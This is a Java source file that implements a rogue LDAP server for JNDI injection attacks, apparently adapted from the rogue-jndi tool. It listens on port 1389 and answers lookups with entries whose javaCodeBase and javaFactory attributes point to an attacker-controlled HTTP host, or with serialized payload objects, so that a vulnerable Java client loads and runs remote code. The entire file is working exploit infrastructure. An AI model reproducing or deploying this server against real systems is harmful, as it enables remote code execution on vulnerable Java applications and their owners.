package itzbenz;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import itzbenz.payload.ObjectPayloadSerializable;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.net.InetAddress;

public class LDAPServer extends InMemoryOperationInterceptor {


    public String host = "http://" + Main.address + ":" + Main.port + "/";


    public static PayloadVector payloadVector = PayloadVector.JavaSerializationObject;

    public static void main(String[] args) throws ClassNotFoundException {
        LDAPTest.main(args);
    }

    //stolen from here, i can't read com.unboundid.ldap documentation
    //https://github.com/veracode-research/rogue-jndi/blob/master/src/main/java/artsploit/LdapServer.java
    public void start() throws Exception {
        System.out.println("Payload Vector: " + payloadVector);
        System.out.println("Starting LDAP server on 0.0.0.0:1389");
        System.out.println("Classpath URL: " + host);
        InMemoryDirectoryServerConfig inMemoryOperationInterceptor = new InMemoryDirectoryServerConfig("dc=example,dc=com");
        inMemoryOperationInterceptor.setListenerConfigs(new InMemoryListenerConfig(
                "listen",
                InetAddress.getByName("0.0.0.0"),
                1389,
                ServerSocketFactory.getDefault(),
                SocketFactory.getDefault(),
                (SSLSocketFactory) SSLSocketFactory.getDefault()));
        inMemoryOperationInterceptor.addInMemoryOperationInterceptor(this);
        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(inMemoryOperationInterceptor);
        ds.startListening();

    }

    ;

    @Override
    public void processSearchResult(InMemoryInterceptedSearchResult result) {
        String base = result.getRequest().getBaseDN();
        String payload;
        try {
            payload = base.split(",")[1].split("=")[1];
        } catch (Exception e) {
            System.err.println("Malformed payload: " + e.getMessage());
            return;
        }
        System.out.println();
        System.out.println("[+] Requested Payload: " + payload);
        if (!Main.payloadExists(payload)) {
            payload = Main.defaultPayload;
            System.err.println("[-] Payload not found, using default: " + payload);
        }
        Entry e = new Entry(base);
        System.out.println("[+] PayloadVector: " + payloadVector);
        switch (payloadVector) {
            case JavaSerializationObject:
            case JavaSerializationString:
                Object payloadObject = payload;
                if (payloadVector == PayloadVector.JavaSerializationObject) {
                    payloadObject = new ObjectPayloadSerializable(payload);
                }
                try {
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    ObjectOutputStream oos = new ObjectOutputStream(baos);
                    oos.writeObject(payloadObject);
                    e.addAttribute("javaClassName", payloadObject.getClass().getName());
                    e.addAttribute("javaSerializedData", baos.toByteArray());
                    if (payloadVector == PayloadVector.JavaSerializationObject)
                        e.addAttribute("javaCodeBase", host);

                } catch (IOException ex) {
                    ex.printStackTrace();
                }

                break;
            case JavaNamingReference:
                System.out.println("Sending LDAP reference result for " + host + payload.replace('.', '/') + ".class");
                e.addAttribute("objectClass", "javaNamingReference");//cool
                e.addAttribute("javaClassName", payload); //unknown if fail ???
                e.addAttribute("javaFactory", payload); //magic payload
                e.addAttribute("javaCodeBase", host);//cool
                break;
            default:
                System.err.println("[-] Unknown payload vector ???");
        }

        try {
            result.sendSearchEntry(e);
        } catch (LDAPException ex) {
            ex.printStackTrace();//uncool
        }
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));//great success
    }

    enum PayloadVector {JavaNamingReference, JavaSerializationString, JavaSerializationObject}


}
